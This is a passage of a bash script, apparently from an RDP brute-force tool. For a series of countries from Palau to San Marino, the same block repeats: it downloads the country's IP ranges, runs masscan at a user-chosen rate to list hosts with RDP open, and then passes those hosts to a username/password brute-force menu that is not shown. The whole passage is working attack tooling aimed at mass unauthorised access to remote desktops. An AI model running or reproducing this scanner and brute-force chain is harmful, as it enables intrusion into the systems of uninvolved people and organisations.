curl http://services.ce3c.be/ciprg/?countrys=PALAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Palau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "144" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PALESTINIAN+TERRITORY+OCCUPIED |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Palestinian Territory Occupied://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "145" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PANAMA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Panama://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "146" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PAPUA+NEW+GUINEA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Papua New Guinea://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "147" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PARAGUAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Paraguay://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "148" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PERU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Peru://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "149" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PHILIPPINES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Philippines://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "150" ]; then
curl http://services.ce3c.be/ciprg/?countrys=POLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Poland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "151" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PORTUGAL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Portugal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "152" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PUERTO+RICO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Puerto Rico://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "153" ]; then
curl http://services.ce3c.be/ciprg/?countrys=QATAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Qatar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "154" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ROMANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Romania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "155" ]; then
curl http://services.ce3c.be/ciprg/?countrys=RUSSIAN+FEDERATION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Russian Federation://g" |sed '$d'>list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "156" ]; then
curl http://services.ce3c.be/ciprg/?countrys=RWANDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Rwanda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "157" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAINT+KITTS+AND+NEVIS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saint Kitts and Nevis://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "158" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAINT+LUCIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Saint Lucia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "159" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAMOA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Samoa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "160" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SAN+MARINO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/San Marino://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

